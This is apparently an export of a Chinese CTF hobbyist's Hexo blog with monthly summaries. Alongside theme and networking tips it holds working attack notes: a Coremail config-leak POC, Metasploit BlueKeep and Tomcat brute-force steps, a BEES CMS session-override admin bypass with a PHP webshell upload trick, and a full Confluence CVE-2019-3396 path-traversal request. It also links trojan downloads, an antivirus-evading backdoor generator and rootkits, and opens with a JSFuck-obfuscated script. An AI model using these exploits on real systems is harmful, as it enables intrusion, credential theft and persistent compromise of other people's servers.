class="line">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]</span><br></pre></td></tr></table></figure><p>chrome控制台解密</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年六月总结</title>
      <link href="/%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%85%AD%E6%9C%88/"/>
      <url>/%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%85%AD%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1906.jpg" alt=""></p><a id="more"></a><h2 id="hexo倒腾"><a href="#hexo倒腾" class="headerlink" title="hexo倒腾"></a>hexo倒腾</h2><h3 id="问题-404页面不能正常显示"><a href="#问题-404页面不能正常显示" class="headerlink" title="问题 404页面不能正常显示"></a>问题 404页面不能正常显示</h3><p>使用官方给的代码时</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8;"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"robots"</span> <span class="attr">content</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"robots"</span> <span class="attr">content</span>=<span class="string">"index,follow"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"https://qzone.qq.com/gy/404/style/404style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/plain"</span> <span class="attr">src</span>=<span class="string">"http://www.qq.com/404/search_children.js"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">homePageUrl</span>=<span class="string">"/"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">homePageName</span>=<span class="string">"回到我的主页"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://qzone.qq.com/gy/404/data.js"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://qzone.qq.com/gy/404/page.js"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地环境正常显示，不过推到github后就成下图所示了</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/404bug.PNG" alt=""></p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>在知乎上看到有人说出现该问题的原因是github个人页强制使用https协议，而上面给的代码是http的，因此无法加载样式表。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>使用购买的域名指向自己的github个人主页，增加CNAME文件，然后调用公益404页面不会出现混合内容那个问题。（还是需要开启https协议！！！！！）</p><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>使用以下代码达到相同的效果 ps:返回主页,后面链接改成自己的即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js"</span> <span class="attr">homePageName</span>=<span class="string">"返回主页"</span> <span class="attr">homePageUrl</span>=<span class="string">"https://7iny.jxustctf.top"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://galaxyhao.github.io/2017/10/21/hexo%E8%85%BE%E8%AE%AF%E5%85%AC%E7%9B%8A404%E7%9A%84%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">参考文章</a></p><h3 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h3><p>我们直接在 NEXT 预留的自定义样式文件 “themes/next/source/css/_custom/custom.styl” 中添加自己的样式即可</p><p>为了让背景图平铺窗口我把scheme值改成了<code>Muse</code></p><p>菜单栏透明度设置后搜索功能不能正常使用，我注释掉了那部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  background: url(https://raw.githubusercontent.com/N407PengYuYan/img/master/img/index.png);</span><br><span class="line">  background-size: cover;</span><br><span class="line">  background-repeat: no-repeat;</span><br><span class="line">  background-attachment: fixed;</span><br><span class="line">  background-position: 50% 50%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改主体透明度</span><br><span class="line">.main-inner &#123;</span><br><span class="line">  background: #fff;</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改菜单栏透明度</span><br><span class="line">.header-inner &#123;</span><br><span class="line">  opacity: 0.9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.diqigan.cn/posts/add-background-picture-for-next.html" target="_blank" rel="noopener">参考文章</a></p><h2 id="实用方法"><a href="#实用方法" class="headerlink" title="实用方法"></a>实用方法</h2><h3 id="win10添加网络打印机"><a href="#win10添加网络打印机" class="headerlink" title="win10添加网络打印机"></a>win10添加网络打印机</h3><p>控制面板-&gt;查看方式按小图标-&gt;凭据管理器-&gt;添加Windows凭据-&gt;输入网络打印机的IP地址,用户密码-&gt;命令行输入目标IP地址<code>\\xxx.xxx.xx.xxx</code></p><p><a href="https://jingyan.baidu.com/article/f71d60377572791ab741d14e.html" target="_blank" rel="noopener">参考文章</a></p><h3 id="校园宽带PPPOE拨号"><a href="#校园宽带PPPOE拨号" class="headerlink" title="校园宽带PPPOE拨号"></a>校园宽带PPPOE拨号</h3><p>路由器登陆选择宽带拨号<br>电信宽带：学号@telecom+密码（默认密码：身份证号后六位）<br>移动宽带：学号@cmcc+密码（默认密码：身份证号后六位）<br>联通宽带：学号@unicom+密码（默认密码：身份证号后六位）</p><p><a href="https://jingyan.baidu.com/article/0320e2c11807df1b86507b6e.html" target="_blank" rel="noopener">参考文章</a></p><h3 id="免费接码平台"><a href="#免费接码平台" class="headerlink" title="免费接码平台"></a>免费接码平台</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">国内免费接码平台</span><br><span class="line"></span><br><span class="line">    https://sms.cm</span><br><span class="line">    https://www.pdflibr.com</span><br><span class="line">    https://www.becmd.com</span><br><span class="line">    http://www.smszk.com</span><br><span class="line"></span><br><span class="line">国外免费接码平台</span><br><span class="line"></span><br><span class="line">    https://zh.mytrashmobile.com（中文）</span><br><span class="line">    https://ch.freephonenum.com（中文）</span><br><span class="line">    SMSReceiveFree：https://smsreceivefree.com</span><br><span class="line">    Receive SMS Online for FREE：https://www.receive-sms-online.info</span><br><span class="line">    Receive a SMS Online：https://receive-a-sms.com</span><br><span class="line">    Free SMS Numbers Online：https://smsnumbersonline.com</span><br><span class="line">    Receive SMS online for Free：https://sms-online.co/receive-free-sms</span><br><span class="line">    Receive-SMS：https://receive-sms.com</span><br><span class="line">    Receive FREE SMS online：http://receivefreesms.com</span><br><span class="line">    RECEIVE SMS ONLINE：https://www.receivesmsonline.net</span><br><span class="line">    Free Online Phone：https://www.freeonlinephone.org</span><br><span class="line">    Receive SMS Online：http://receive-sms-online.com</span><br><span class="line">    TextNow：https://www.textnow.com</span><br><span class="line">    Textfree：https://www.pinger.com/text-free/</span><br><span class="line">    SELLAITE：http://sms.sellaite.com/</span><br><span class="line">    Twilio：https://www.twilio.com/</span><br><span class="line">    https://receive-sms.com/</span><br><span class="line">    http://receive-sms-online.com/</span><br><span class="line">    http://sms.sellaite.com/</span><br><span class="line">    http://hs3x.com/</span><br><span class="line">    http://receivefreesms.net</span><br><span class="line">    http://receivesmsonline.in</span><br><span class="line">    http://www.receive-sms-now.com</span><br><span class="line">    https://sms-receive.net</span><br><span class="line">    https://www.receivesms.net</span><br><span class="line">    http://www.freesmsverifications.com</span><br><span class="line">    http://receiveonlinesms.biz</span><br><span class="line">    http://receivesmsverification.com</span><br><span class="line">    https://www.receivesms.co</span><br><span class="line">    http://receiveonlinesms.com</span><br></pre></td></tr></table></figure><p><a href="https://liyuans.com/2019/01/freesms.html" target="_blank" rel="noopener">参考文章</a></p><h2 id="借助插件科学上网"><a href="#借助插件科学上网" class="headerlink" title="借助插件科学上网"></a>借助插件科学上网</h2><p>有时候代理会被大面积封锁，可是我们又需要进行学习，那么我们可以用第三方插件来满足我们的搜索需求</p><p><code>Ghelper</code>源码安装chrome插件</p><blockquote><p>1.打开你的Chrome浏览器的 更多工具&gt;扩展程序页面.<br>或者直接在网址输入: chrome://extensions/<br>2.这个页面点击 “添加已解压的扩展程序”<br>3.选择本次下载包里的 ghelper_source 目录<br>4.确认后就行了.</p></blockquote><p><a href="http://googlehelper.net/" target="_blank" rel="noopener">官网下载地址</a></p><h2 id="木马下载"><a href="#木马下载" class="headerlink" title="木马下载"></a>木马下载</h2><p><a href="http://www.mumaasp.com/category/%E5%85%8D%E6%9D%80asp%E6%9C%A8%E9%A9%AC" target="_blank" rel="noopener">asp木马</a></p><h2 id="Coremail-0day-敏感文件泄露漏洞"><a href="#Coremail-0day-敏感文件泄露漏洞" class="headerlink" title="Coremail 0day 敏感文件泄露漏洞"></a>Coremail 0day 敏感文件泄露漏洞</h2><p> <strong>POC:</strong> </p><blockquote><p>/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/</p></blockquote><p><strong>通过域名或者IP等地址+POC即可获取目标邮件服务器配置文件，配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。</strong></p><p><a href="https://www.7ooc.cn/web/15.html" target="_blank" rel="noopener">参考文章</a></p><p>2.apiws</p><blockquote><p><a href="http://host/apiws/services/" target="_blank" rel="noopener">http://host/apiws/services/</a></p></blockquote><blockquote><p><a href="http://host/apiws/services/API?wsdl" target="_blank" rel="noopener">http://host/apiws/services/API?wsdl</a></p></blockquote><p><a href="https://blog.csdn.net/qq_41770175/article/details/91971177" target="_blank" rel="noopener">参考文章</a></p><p><a href="https://www.cnvd.org.cn/webinfo/show/5075" target="_blank" rel="noopener">cnvd通告</a></p><h2 id="漏洞CVE-2019-0708"><a href="#漏洞CVE-2019-0708" class="headerlink" title="漏洞CVE-2019-0708"></a><strong>漏洞CVE-2019-0708</strong></h2><p>影响：该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows xp * 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。</p><p>kali依次执行验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">set RHOSTS x.x.x.x</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="BEES企业网站管理系统漏洞"><a href="#BEES企业网站管理系统漏洞" class="headerlink" title="BEES企业网站管理系统漏洞"></a>BEES企业网站管理系统漏洞</h2><p>1.漏洞地址<a href="http://host/mx_form/mx_form.php?id=2" target="_blank" rel="noopener">http://host/mx_form/mx_form.php?id=2</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用火狐里面的firebug插件用post参数，覆盖session值，之后便可直接登录后台：_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=100000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>2.执行之后访问<a href="http://host/admin/admin.php" target="_blank" rel="noopener">http://host/admin/admin.php</a><br>3.点击内容管理—&gt;上传照片管理—&gt;修改<br>4.上传图片马，用burpsuite拦截将jpg改为php，即可绕过上传限制</p><h2 id="CVE-2019-3396"><a href="#CVE-2019-3396" class="headerlink" title="CVE-2019-3396"></a>CVE-2019-3396</h2><p>漏洞描述中指出Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。</p><p>漏洞分析参看<a href="https://paper.seebug.org/884/" target="_blank" rel="noopener">文章</a></p><p>Burp Suit复现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Referer:http://x.x.x.x/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc6&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;../web.xml&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>更多功能</p><p><a href="https://github.com/jas502n/CVE-2019-3396/" target="_blank" rel="noopener">参考1</a></p><p><a href="https://mp.weixin.qq.com/s/SycP0RCzMLazansAsp-D5Q" target="_blank" rel="noopener">获取shell</a></p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Github渗透工具资源整合"><a href="#Github渗透工具资源整合" class="headerlink" title="Github渗透工具资源整合"></a>Github渗透工具资源整合</h2><p> 超级弱口令多线程检查审计工具SNETCracker<br>可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<a href="https://github.com/shack2/SNETCracker/releases" target="_blank" rel="noopener">下载地址</a></p><p>Github关键字监测、告警、发现<a href="https://github.com/deepdivesec/GitMAD" target="_blank" rel="noopener">下载地址</a></p><p>AVIator是一个后门生成器实用程序，它使用加密和注入技术来绕过AV检测。<a href="https://github.com/Ch0pin/AVIator" target="_blank" rel="noopener">下载地址</a></p><p>Vxscan：一款用于渗透测试的多功能扫描工具<a href="https://github.com/al0ne/Vxscan" target="_blank" rel="noopener">下载地址</a></p><p>thinkphp v5.x 远程代码执行漏洞-POC集合<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">下载地址</a></p><h2 id="实战中常用工具汇总"><a href="#实战中常用工具汇总" class="headerlink" title="实战中常用工具汇总"></a>实战中常用工具汇总</h2><p>1.进程隐藏工具<br><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">libprocesshider</a><br><a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">Reptile</a><br>2.流量代理工具proxy<br><a href="https://github.com/vzex/dog-tunnel" target="_blank" rel="noopener">dog-tunnel</a><br>3.Linux辅助提权工具LinEnum.sh<br><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a><br>4.脏牛提权工具c0w64<br><a href="https://github.com/Brucetg/DirtyCow-EXP" target="_blank" rel="noopener">c0w64</a><br>5.内网流量代理工具agent.exe<br><a href="https://github.com/cnlh/nps" target="_blank" rel="noopener">nps</a> </p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年五月总结</title>
      <link href="/%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%BA%94%E6%9C%88/"/>
      <url>/%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%BA%94%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1905.jpg" alt=""></p><a id="more"></a><h2 id="学习博客"><a href="#学习博客" class="headerlink" title="学习博客"></a>学习博客</h2><p>1.漏洞挖掘大佬<code>blackwolf</code>的<a href="https://blackwolfsec.cc/" target="_blank" rel="noopener">博客</a></p><p>2.mntn0x的<a href="https://mntn0x.github.io/" target="_blank" rel="noopener">博客</a></p><h2 id="Tomcat密码爆破"><a href="#Tomcat密码爆破" class="headerlink" title="Tomcat密码爆破"></a>Tomcat密码爆破</h2><p>使用<strong>Metasploit</strong>实现Tomcat密码爆破</p><p>1.启动</p><blockquote><p>msfconsole</p></blockquote><p>2.搜索模块</p><blockquote><p>search tomcat </p></blockquote><p>3.调用模块</p><blockquote><p>use auxiliary/scanner/http/tomcat_mgr_login</p></blockquote><p>4.配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">配置RHOST,RHOST是目标主机IP</span><br><span class="line">&gt; set RHOST X.X.X.X</span><br><span class="line">配置RPORT,RPORT是目标主机端口</span><br><span class="line">&gt; set RPORT XXXX</span><br><span class="line"></span><br><span class="line">更改字典：可以通过设定PASS_FILE和USER_FILE配置项的路径进行更改（通常情况默认就行了）</span><br></pre></td></tr></table></figure><p>5.运行</p><blockquote><p>run</p></blockquote><p>参考文章</p><p>1.<a href="https://blog.csdn.net/itest_2016/article/details/76520723?utm_source=blogxgwz0" target="_blank" rel="noopener">Tomcat密码爆破小记</a></p><h2 id="next主题倒腾"><a href="#next主题倒腾" 